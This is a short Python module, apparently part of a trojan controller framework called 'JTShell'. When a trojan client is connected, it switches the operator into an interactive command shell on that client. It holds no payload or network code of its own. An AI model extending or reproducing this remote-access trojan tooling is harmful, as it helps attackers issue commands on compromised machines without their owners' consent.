__author__ = 'Jonas'
from trojanshell import TrojanShell
from util import shellprint
from JTShell.util.error import ProcessError
from JTShell.util.message import Message
from commandshell import CommandShell


def run(process):
    shell = process.shell
    if isinstance(shell, TrojanShell):
        # checking whether there is a trojan connected to the shell
        if len(shell.client.available) >= 1:
            shellprint(process, Message("process", "now entering command mode..."))
            commandshell = CommandShell(shell)
            commandshell.run()
            return "command shell  has been successfully terminated"
        else:
            raise ProcessError("there is no trojan connected to enter command mode for")


